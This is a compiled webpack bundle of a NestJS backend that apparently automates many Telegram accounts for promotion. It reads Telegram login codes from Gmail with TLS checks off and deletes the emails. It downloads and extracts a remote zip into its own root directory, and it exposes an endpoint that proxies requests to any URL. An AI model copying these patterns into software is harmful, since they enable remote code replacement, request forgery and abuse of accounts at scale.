/******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	var __webpack_modules__ = ({

/***/ "./src/IMap/IMap.ts":
/*!**************************!*\
  !*** ./src/IMap/IMap.ts ***!
  \**************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.MailReader = void 0;
const imap_1 = __importDefault(__webpack_require__(/*! imap */ "imap"));
const utils_1 = __webpack_require__(/*! ../utils */ "./src/utils/index.ts");
const parseError_1 = __webpack_require__(/*! ../utils/parseError */ "./src/utils/parseError.ts");
class MailReader {
    constructor() {
        this.isReady = false;
        this.result = '';
        this.imap = new imap_1.default({
            user: process.env.GMAIL_ADD || '',
            password: process.env.GMAIL_PASS || '',
            host: 'imap.gmail.com',
            port: 993,
            tls: true,
            tlsOptions: {
                rejectUnauthorized: false,
            },
        });
        this.imap.on('ready', () => {
            console.log('Mail is Ready');
            this.isReady = true;
        });
        this.imap.on('error', (err) => {
            console.error('SomeError:', err);
            this.isReady = false;
        });
        this.imap.on('end', () => {
            console.log('Connection ended');
            this.isReady = false;
        });
    }
    static getInstance() {
        if (!MailReader.instance) {
            MailReader.instance = new MailReader();
        }
        return MailReader.instance;
    }
    async connectToMail() {
        console.log('Connecting to mail server');
        try {
            this.imap.connect();
            this.isReady = true;
            console.log('Connected to mail server');
        }
        catch (err) {
            console.error('Error connecting to mail server:', (0, parseError_1.parseError)(err));
            throw err;
        }
    }
    async disconnectFromMail() {
        console.log('Disconnecting from mail server');
        try {
            this.imap.end();
            this.isReady = false;
            console.log('Disconnected from mail server');
        }
        catch (err) {
            console.error('Error disconnecting from mail server:', (0, parseError_1.parseError)(err));
            throw err;
        }
    }
    async isMailReady() {
        return this.isReady;
    }
    async getCode() {
        console.log("MailReady : ", this.isReady);
        if (!this.isReady) {
            console.log("Re-Connecting mail server");
            await this.connectToMail();
            await (0, utils_1.sleep)(10000);
        }
        try {
            await this.openInbox();
            const searchCriteria = [['FROM', 'noreply@telegram.org']];
            const fetchOptions = { bodies: ['HEADER', 'TEXT'], markSeen: true };
            console.log('Inbox Opened');
            const results = await new Promise((resolve, reject) => {
                this.imap.search(searchCriteria, (err, results) => {
                    if (err) {
                        console.error('Search error:', (0, parseError_1.parseError)(err));
                        reject(err);
                    }
                    else {
                        resolve(results);
                    }
                });
            });
            if (results.length > 0) {
                console.log('Emails found:', results.length);
                const length = results.length;
                const fetch = this.imap.fetch([results[length - 1]], fetchOptions);
                await new Promise((resolve, reject) => {
                    fetch.on('message', (msg, seqno) => {
                        const emailData = [];
                        msg.on('body', (stream, info) => {
                            let buffer = '';
                            stream.on('data', (chunk) => buffer += chunk.toString('utf8'));
                            stream.on('end', () => {
                                if (info.which === 'TEXT') {
                                    emailData.push(buffer);
                                }
                                this.imap.seq.addFlags([seqno], '\\Deleted', (err) => {
                                    if (err)
                                        reject(err);
                                    this.imap.expunge((err) => {
                                        if (err)
                                            reject(err);
                                        console.log('Deleted message');
                                    });
                                });
                            });
                        });
                        msg.once('end', () => {
                            console.log(`Email #${seqno}, Latest ${results[length - 1]}`);
                            console.log('EmailDataLength:', emailData.length);
                            console.log('Mail:', emailData[emailData.length - 1].split('.'));
                            this.result = (0, utils_1.fetchNumbersFromString)(emailData[emailData.length - 1].split('.')[0]);
                            resolve();
                        });
                    });
                    fetch.once('end', () => {
                        console.log('Fetched mails');
                        resolve();
                    });
                });
            }
            else {
                console.log('No new emails found');
            }
            console.log('Returning result:', this.result);
            return this.result;
        }
        catch (error) {
            console.error('Error:', error);
            this.isReady = false;
            throw error;
        }
    }
    async openInbox() {
        await new Promise((resolve, reject) => {
            this.imap.openBox('INBOX', false, (err) => {
                if (err) {
                    console.error('Open Inbox error:', (0, parseError_1.parseError)(err));
                    reject(err);
                }
                else {
                    console.log('Inbox opened');
                    resolve();
                }
            });
        });
    }
}
exports.MailReader = MailReader;


/***/ }),

/***/ "./src/app.controller.ts":
/*!*******************************!*\
  !*** ./src/app.controller.ts ***!
  \*******************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
var AppController_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AppController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const execute_request_dto_1 = __webpack_require__(/*! ./components/shared/dto/execute-request.dto */ "./src/components/shared/dto/execute-request.dto.ts");
const crypto_1 = __webpack_require__(/*! crypto */ "crypto");
const https = __importStar(__webpack_require__(/*! https */ "https"));
const url_1 = __webpack_require__(/*! url */ "url");
let AppController = AppController_1 = class AppController {
    constructor() {
        this.logger = new common_1.Logger(AppController_1.name);
        this.DEFAULT_TIMEOUT = 30000;
        this.MAX_CONTENT_SIZE = 50 * 1024 * 1024;
    }
    getHello() {
        return 'Hello World!';
    }
    async executeRequest(req, res) {
        const requestId = (0, crypto_1.randomUUID)();
        const startTime = Date.now();
        try {
            const { url, method = 'GET', headers = {}, data, params, responseType = 'json', timeout = this.DEFAULT_TIMEOUT, followRedirects = true, maxRedirects = 5 } = req;
            if (!url) {
                throw new common_1.HttpException('URL is required', common_1.HttpStatus.BAD_REQUEST);
            }
            try {
                const parsedUrl = new url_1.URL(url);
                if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
                    throw new common_1.HttpException('Invalid URL protocol. Only HTTP and HTTPS are supported.', common_1.HttpStatus.BAD_REQUEST);
                }
            }
            catch (error) {
                throw new common_1.HttpException('Invalid URL format', common_1.HttpStatus.BAD_REQUEST);
            }
            const httpsAgent = new https.Agent({
                rejectUnauthorized: true
            });
            this.logger.log({
                message: 'Executing HTTP request',
                requestId,
                details: {
                    url,
                    method,
                    headers: this.sanitizeHeaders(headers),
                    params,
                    responseType,
                    timeout,
                    dataSize: data ? JSON.stringify(data).length : 0
                }
            });
            const response = await (0, axios_1.default)({
                url,
                method,
                headers,
                data,
                params,
                responseType,
                timeout,
                maxRedirects: followRedirects ? maxRedirects : 0,
                maxContentLength: this.MAX_CONTENT_SIZE,
                maxBodyLength: this.MAX_CONTENT_SIZE,
                validateStatus: null,
                decompress: true,
                httpsAgent,
                transitional: {
                    clarifyTimeoutError: true
                }
            });
            const executionTime = Date.now() - startTime;
            this.logger.log({
                message: 'Request completed',
                requestId,
                metrics: {
                    executionTime,
                    status: response.status,
                    contentType: response.headers['content-type'],
                    contentLength: response.headers['content-length']
                }
            });
            Object.entries(response.headers).forEach(([key, value]) => {
                if (key.toLowerCase() === 'transfer-encoding')
                    return;
                if (Array.isArray(value)) {
                    res.setHeader(key, value);
                }
                else if (value) {
                    res.setHeader(key, value.toString());
                }
            });
            res.status(response.status);
            if (this.isBinaryResponse(responseType, response.headers['content-type'])) {
                if (!res.getHeader('content-type') && response.headers['content-type']) {
                    res.setHeader('content-type', response.headers['content-type']);
                }
                res.send(Buffer.from(response.data));
                return;
            }
            res.send(response.data);
            return;
        }
        catch (error) {
            const errorDetails = this.handleRequestError(error, requestId);
            this.logger.error({
                message: 'Request failed',
                requestId,
                error: errorDetails
            });
            res.status(errorDetails.status || common_1.HttpStatus.INTERNAL_SERVER_ERROR);
            res.send(errorDetails);
            return;
        }
    }
    sanitizeHeaders(headers) {
        const sensitiveHeaders = ['authorization', 'cookie', 'proxy-authorization', 'x-api-key'];
        const sanitized = { ...headers };
        sensitiveHeaders.forEach(header => {
            Object.keys(sanitized).forEach(key => {
                if (key.toLowerCase() === header.toLowerCase()) {
                    sanitized[key] = '[REDACTED]';
                }
            });
        });
        return sanitized;
    }
    isBinaryResponse(responseType, contentType) {
        if (responseType === 'arraybuffer')
            return true;
        if (contentType) {
            const binaryTypes = [
                'application/octet-stream',
                'image/',
                'audio/',
                'video/',
                'application/pdf',
                'application/zip',
                'application/x-zip-compressed',
                'application/binary'
            ];
            return binaryTypes.some(type => contentType.toLowerCase().includes(type.toLowerCase()));
        }
        return false;
    }
    handleRequestError(error, requestId) {
        if (axios_1.default.isAxiosError(error)) {
            const axiosError = error;
            if (axiosError.code === 'ECONNABORTED') {
                return {
                    status: common_1.HttpStatus.GATEWAY_TIMEOUT,
                    error: 'Request timeout',
                    message: 'The request took too long to complete',
                    requestId
                };
            }
            if (axiosError.code === 'ECONNREFUSED') {
                return {
                    status: common_1.HttpStatus.BAD_GATEWAY,
                    error: 'Connection refused',
                    message: 'Could not connect to the target server',
                    requestId
                };
            }
            if (axiosError.response) {
                return {
                    status: axiosError.response.status,
                    headers: this.sanitizeHeaders(axiosError.response.headers),
                    data: axiosError.response.data,
                    requestId
                };
            }
            if (axiosError.request) {
                return {
                    status: common_1.HttpStatus.BAD_GATEWAY,
                    error: 'No response',
                    message: 'The request was made but no response was received',
                    code: axiosError.code,
                    requestId
                };
            }
            return {
                status: common_1.HttpStatus.BAD_GATEWAY,
                error: axiosError.code || 'Request failed',
                message: axiosError.message,
                requestId
            };
        }
        return {
            status: common_1.HttpStatus.INTERNAL_SERVER_ERROR,
            error: 'Internal server error',
            message: error.message || 'An unexpected error occurred',
            requestId
        };
    }
};
exports.AppController = AppController;
__decorate([
    (0, common_1.Get)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", String)
], AppController.prototype, "getHello", null);
__decorate([
    (0, common_1.Post)('execute-request'),
    (0, swagger_1.ApiOperation)({
        summary: 'Execute an HTTP request with given details',
        description: 'Makes an HTTP request to the specified URL with provided configuration and returns the response'
    }),
    (0, swagger_1.ApiResponse)({ status: 201, description: 'Request executed successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid request parameters' }),
    (0, swagger_1.ApiResponse)({ status: 429, description: 'Too many requests' }),
    (0, swagger_1.ApiResponse)({ status: 500, description: 'Internal server error or request execution failed' }),
    __param(0, (0, common_1.Body)(new common_1.ValidationPipe({
        transform: true,
        forbidNonWhitelisted: true,
        whitelist: true
    }))),
    __param(1, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [execute_request_dto_1.ExecuteRequestDto, Object]),
    __metadata("design:returntype", Promise)
], AppController.prototype, "executeRequest", null);
exports.AppController = AppController = AppController_1 = __decorate([
    (0, swagger_1.ApiTags)('App'),
    (0, common_1.Controller)(),
    __metadata("design:paramtypes", [])
], AppController);


/***/ }),

/***/ "./src/app.module.ts":
/*!***************************!*\
  !*** ./src/app.module.ts ***!
  \***************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AppModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const users_module_1 = __webpack_require__(/*! ./components/users/users.module */ "./src/components/users/users.module.ts");
const user_data_module_1 = __webpack_require__(/*! ./components/user-data/user-data.module */ "./src/components/user-data/user-data.module.ts");
const client_module_1 = __webpack_require__(/*! ./components/clients/client.module */ "./src/components/clients/client.module.ts");
const Telegram_module_1 = __webpack_require__(/*! ./components/Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ./components/buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
const active_channels_module_1 = __webpack_require__(/*! ./components/active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const archived_client_module_1 = __webpack_require__(/*! ./components/archived-clients/archived-client.module */ "./src/components/archived-clients/archived-client.module.ts");
const init_module_1 = __webpack_require__(/*! ./components/ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const channels_module_1 = __webpack_require__(/*! ./components/channels/channels.module */ "./src/components/channels/channels.module.ts");
const app_controller_1 = __webpack_require__(/*! ./app.controller */ "./src/app.controller.ts");
const logger_middleware_1 = __webpack_require__(/*! ./middlewares/logger.middleware */ "./src/middlewares/logger.middleware.ts");
const build_module_1 = __webpack_require__(/*! ./components/builds/build.module */ "./src/components/builds/build.module.ts");
const upi_ids_module_1 = __webpack_require__(/*! ./components/upi-ids/upi-ids.module */ "./src/components/upi-ids/upi-ids.module.ts");
const promote_msgs_module_1 = __webpack_require__(/*! ./components/promote-msgs/promote-msgs.module */ "./src/components/promote-msgs/promote-msgs.module.ts");
const stat_module_1 = __webpack_require__(/*! ./components/stats/stat.module */ "./src/components/stats/stat.module.ts");
const stat2_module_1 = __webpack_require__(/*! ./components/stats2/stat2.module */ "./src/components/stats2/stat2.module.ts");
const promote_stat_module_1 = __webpack_require__(/*! ./components/promote-stats/promote-stat.module */ "./src/components/promote-stats/promote-stat.module.ts");
const promote_client_module_1 = __webpack_require__(/*! ./components/promote-clients/promote-client.module */ "./src/components/promote-clients/promote-client.module.ts");
const tg_signup_module_1 = __webpack_require__(/*! ./components/TgSignup/tg-signup.module */ "./src/components/TgSignup/tg-signup.module.ts");
const transaction_module_1 = __webpack_require__(/*! ./components/transactions/transaction.module */ "./src/components/transactions/transaction.module.ts");
const npoint_module_1 = __webpack_require__(/*! ./components/n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
const timestamp_module_1 = __webpack_require__(/*! ./components/timestamps/timestamp.module */ "./src/components/timestamps/timestamp.module.ts");
const dynamic_data_module_1 = __webpack_require__(/*! ./components/dynamic-data/dynamic-data.module */ "./src/components/dynamic-data/dynamic-data.module.ts");
const session_manager_1 = __webpack_require__(/*! ./components/session-manager */ "./src/components/session-manager/index.ts");
const ip_management_module_1 = __webpack_require__(/*! ./components/ip-management/ip-management.module */ "./src/components/ip-management/ip-management.module.ts");
const core_1 = __webpack_require__(/*! @nestjs/core */ "@nestjs/core");
const auth_guard_1 = __webpack_require__(/*! ./guards/auth.guard */ "./src/guards/auth.guard.ts");
let AppModule = class AppModule {
    configure(consumer) {
        consumer.apply(logger_middleware_1.LoggerMiddleware).forRoutes('*');
    }
};
exports.AppModule = AppModule;
exports.AppModule = AppModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            Telegram_module_1.TelegramModule,
            active_channels_module_1.ActiveChannelsModule,
            client_module_1.ClientModule,
            session_manager_1.SessionModule,
            ip_management_module_1.IpManagementModule,
            user_data_module_1.UserDataModule,
            users_module_1.UsersModule,
            buffer_client_module_1.BufferClientModule,
            archived_client_module_1.ArchivedClientModule,
            channels_module_1.ChannelsModule,
            promote_client_module_1.PromoteClientModule,
            build_module_1.BuildModule,
            upi_ids_module_1.UpiIdModule,
            promote_msgs_module_1.PromoteMsgModule,
            promote_stat_module_1.PromoteStatModule,
            stat_module_1.StatModule,
            stat2_module_1.Stat2Module,
            tg_signup_module_1.TgSignupModule,
            transaction_module_1.TransactionModule,
            npoint_module_1.NpointModule,
            timestamp_module_1.TimestampModule,
            dynamic_data_module_1.DynamicDataModule,
        ],
        providers: [
            {
                provide: core_1.APP_GUARD,
                useClass: auth_guard_1.ApiKeyOrIpOrOriginGuard,
            },
        ],
        controllers: [app_controller_1.AppController],
        exports: [
            Telegram_module_1.TelegramModule,
            active_channels_module_1.ActiveChannelsModule,
            client_module_1.ClientModule,
            user_data_module_1.UserDataModule,
            users_module_1.UsersModule,
            buffer_client_module_1.BufferClientModule,
            archived_client_module_1.ArchivedClientModule,
            channels_module_1.ChannelsModule,
            promote_client_module_1.PromoteClientModule,
            tg_signup_module_1.TgSignupModule,
            transaction_module_1.TransactionModule,
            timestamp_module_1.TimestampModule,
        ]
    })
], AppModule);


/***/ }),

/***/ "./src/cloudinary.ts":
/*!***************************!*\
  !*** ./src/cloudinary.ts ***!
  \***************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CloudinaryService = void 0;
console.log("in Cloudinary");
const cloudinary = __importStar(__webpack_require__(/*! cloudinary */ "cloudinary"));
const path = __importStar(__webpack_require__(/*! path */ "path"));
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const adm_zip_1 = __importDefault(__webpack_require__(/*! adm-zip */ "adm-zip"));
const parseError_1 = __webpack_require__(/*! ./utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ./utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
class CloudinaryService {
    constructor() {
        this.resources = new Map();
        cloudinary.v2.config({
            cloud_name: process.env.CL_NAME,
            api_key: process.env.CL_APIKEY,
            api_secret: process.env.CL_APISECRET
        });
    }
    static async getInstance(name) {
        if (!CloudinaryService.instance) {
            CloudinaryService.instance = new CloudinaryService();
        }
        await CloudinaryService.instance.getResourcesFromFolder(name);
        return CloudinaryService.instance;
    }
    async downloadAndExtractZip(url) {
        const rootPath = process.cwd();
        const zipPath = path.resolve(rootPath, 'temp.zip');
        const extractPath = path.resolve(rootPath);
        console.log(`Starting download of zip file from ${url}`);
        const response = await (0, fetchWithTimeout_1.fetchWithTimeout)(url, { responseType: 'arraybuffer' });
        if (response?.status === 200) {
            console.log('Zip file downloaded successfully.');
            fs.writeFileSync(zipPath, response.data);
            console.log(`Zip file saved to ${zipPath}`);
            const zip = new adm_zip_1.default(zipPath);
            console.log(`Extracting zip file to ${extractPath}`);
            zip.extractAllTo(extractPath, true);
            console.log('Zip file extracted successfully.');
            fs.unlinkSync(zipPath);
            console.log(`Temporary zip file ${zipPath} deleted.`);
        }
        else {
            const errorMessage = `Unable to download zip file from ${url}`;
            console.error(errorMessage);
            throw new Error(errorMessage);
        }
    }
    async getResourcesFromFolder(folderName) {
        console.log('FETCHING NEW FILES!! from CLOUDINARY');
        await this.downloadAndExtractZip(`https://cms.paidgirl.site/folders/${folderName}/files/download-all`);
    }
    async createNewFolder(folderName) {
        await this.createFolder(folderName);
        await this.uploadFilesToFolder(folderName);
    }
    async overwriteFile() {
        const cloudinaryFileId = "index_nbzca5.js";
        const localFilePath = "./src/test.js";
        try {
            const result = await cloudinary.v2.uploader.upload(localFilePath, {
                resource_type: 'auto',
                overwrite: true,
                invalidate: true,
                public_id: cloudinaryFileId
            });
            console.log(result);
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
    async findAndSaveResources(folderName, type) {
        try {
            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });
            await Promise.all(resources.map(async (resource) => {
                try {
                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);
                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);
                }
                catch (error) {
                    console.log(resource);
                    (0, parseError_1.parseError)(error);
                }
            }));
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
    async createFolder(folderName) {
        try {
            const result = await cloudinary.v2.api.create_folder(folderName);
            return result;
        }
        catch (error) {
            console.error('Error creating folder:', error);
            throw error;
        }
    }
    async uploadFilesToFolder(folderName) {
        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {
            try {
                const result = await cloudinary.v2.uploader.upload_large(url, {
                    folder: folderName,
                    resource_type: 'auto',
                    public_id: key,
                });
                return result;
            }
            catch (error) {
                console.error('Error uploading file:', error);
                throw error;
            }
        });
        try {
            return await Promise.all(uploadPromises);
        }
        catch (error) {
            console.error('Error uploading files:', error);
            throw error;
        }
    }
    async printResources() {
        try {
            this.resources?.forEach((val, key) => {
                console.log(key, ":", val);
            });
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
    get(publicId) {
        try {
            const result = this.resources.get(publicId);
            return result || '';
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
    getBuffer(publicId) {
        try {
            const result = this.resources.get(publicId);
            return result || '';
        }
        catch (error) {
            console.log(error);
        }
    }
}
exports.CloudinaryService = CloudinaryService;
async function saveFile(url, name) {
    try {
        const extension = url.substring(url.lastIndexOf('.') + 1);
        const rootPath = process.cwd();
        const mypath = path.join(rootPath, `${name}.${extension}`);
        console.log(mypath);
        const res = await (0, fetchWithTimeout_1.fetchWithTimeout)(url, { responseType: 'arraybuffer' }, 2);
        if (res?.statusText === 'OK') {
            if (!fs.existsSync(mypath)) {
                fs.writeFileSync(mypath, res.data, 'binary');
                console.log(`${name}.${extension} Saved!!`);
            }
            else {
                fs.unlinkSync(mypath);
                fs.writeFileSync(mypath, res.data, 'binary');
                console.log(`${name}.${extension} Replaced!!`);
            }
        }
        else {
            throw new Error(`Unable to download file from ${url}`);
        }
    }
    catch (err) {
        (0, parseError_1.parseError)(err);
    }
}


/***/ }),

/***/ "./src/components/ConfigurationInit/configuration.schema.ts":
/*!******************************************************************!*\
  !*** ./src/components/ConfigurationInit/configuration.schema.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationSchema = exports.Configuration = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let Configuration = class Configuration {
};
exports.Configuration = Configuration;
exports.Configuration = Configuration = __decorate([
    (0, mongoose_1.Schema)({
        versionKey: false, autoIndex: true, strict: false, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], Configuration);
exports.ConfigurationSchema = mongoose_1.SchemaFactory.createForClass(Configuration);
exports.ConfigurationSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/ConfigurationInit/index.ts":
/*!***************************************************!*\
  !*** ./src/components/ConfigurationInit/index.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./configuration.schema */ "./src/components/ConfigurationInit/configuration.schema.ts"), exports);
__exportStar(__webpack_require__(/*! ./init.controller */ "./src/components/ConfigurationInit/init.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./init.module */ "./src/components/ConfigurationInit/init.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./init.service */ "./src/components/ConfigurationInit/init.service.ts"), exports);


/***/ }),

/***/ "./src/components/ConfigurationInit/init.controller.ts":
/*!*************************************************************!*\
  !*** ./src/components/ConfigurationInit/init.controller.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const init_service_1 = __webpack_require__(/*! ./init.service */ "./src/components/ConfigurationInit/init.service.ts");
let ConfigurationController = class ConfigurationController {
    constructor(configurationService) {
        this.configurationService = configurationService;
    }
    async findOne() {
        return this.configurationService.findOne();
    }
    async update(updateClientDto) {
        return this.configurationService.update(updateClientDto);
    }
};
exports.ConfigurationController = ConfigurationController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get configuration data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ConfigurationController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update configuration' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ConfigurationController.prototype, "update", null);
exports.ConfigurationController = ConfigurationController = __decorate([
    (0, swagger_1.ApiTags)('Configuration'),
    (0, common_1.Controller)('configuration'),
    __metadata("design:paramtypes", [init_service_1.ConfigurationService])
], ConfigurationController);


/***/ }),

/***/ "./src/components/ConfigurationInit/init.module.ts":
/*!*********************************************************!*\
  !*** ./src/components/ConfigurationInit/init.module.ts ***!
  \*********************************************************/
